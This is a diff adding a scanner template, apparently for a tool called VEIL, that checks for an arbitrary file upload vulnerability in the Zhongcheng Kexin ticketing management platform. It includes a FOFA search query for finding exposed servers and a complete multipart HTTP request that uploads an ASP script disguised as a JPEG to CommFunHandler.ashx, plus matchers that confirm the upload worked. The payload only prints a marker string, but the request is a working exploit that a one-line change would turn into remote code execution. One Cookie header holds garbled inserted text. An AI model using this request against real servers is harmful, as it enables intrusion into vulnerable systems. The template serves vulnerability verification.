@@ -1,0 +1,67 @@
+## id: VEID-2024-0406
+## name: 中成科信票务管理平台任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description: 中成科信票务管理平台任意文件上传漏洞
+## fofa-query: body="技术支持：北京中成科信科技发展有限公司"
+## verification: true
+
+
+POST /SystemManager/Comm/CommFunHandler.ashx HTTP/1.1
+Host: {{Hostname}}
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: {{random_ua}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: ASP.NET Core | Open-source web framework for .NET_SessionId=zaiwm34v0gxjfsfcjx3zvw5u
+Connection: close
+Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
+Content-Length: 864
+
+
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="file"; filename="1.txt"
+Content-Type: image/jpeg
+
+<%
+Response.Write("hello veil")
+%>
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="fileName"
+
+1.asp
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="Method"
+
+UploadZoneImg
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="solutionNo"
+
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="siteNo"
+
+1
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="showNo"
+
+1
+----------------------------354575237365372692397370
+Content-Disposition: form-data; name="showingNo"
+
+1
+----------------------------354575237365372692397370--
+
+
+
+#@ condition: and
+#@ matcher: body contains "-1-1-1.asp"
+#@ matcher: status_code == 200
+
+
+
+
+# @VEIL-STAMP: afbe295f34305a8dd9607d621fd2a9782d7c14796c1179513389f16f62890551
